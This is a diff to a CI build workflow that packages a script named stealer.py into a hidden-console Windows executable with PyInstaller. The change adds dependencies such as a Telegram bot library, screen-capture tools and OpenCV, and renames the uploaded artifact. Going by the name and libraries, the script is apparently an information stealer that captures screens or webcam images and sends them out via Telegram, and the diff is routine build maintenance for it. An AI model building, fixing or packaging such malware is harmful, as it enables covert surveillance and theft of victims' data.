@@ -11,12 +11,13 @@ jobs:
           python-version: '3.9'
       - name: Install dependencies
         run: |
-          pip install pywin32 requests opencv-python pyinstaller
+          pip install pyTelegramBotAPI Pillow opencv-python pywin32 pyautogui requests pyinstaller
       - name: Build with PyInstaller
         run: |
-          pyinstaller --noconsole --onefile stealer.py
+          # Собираем в папку, а не в один файл, чтобы не было ошибок конфигурации
+          pyinstaller --noconsole --collect-all cv2 --collect-all pyautogui stealer.py
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: stealer-exe
-          path: dist/stealer.exe
+          name: stealer-dist
+          path: dist/stealer/
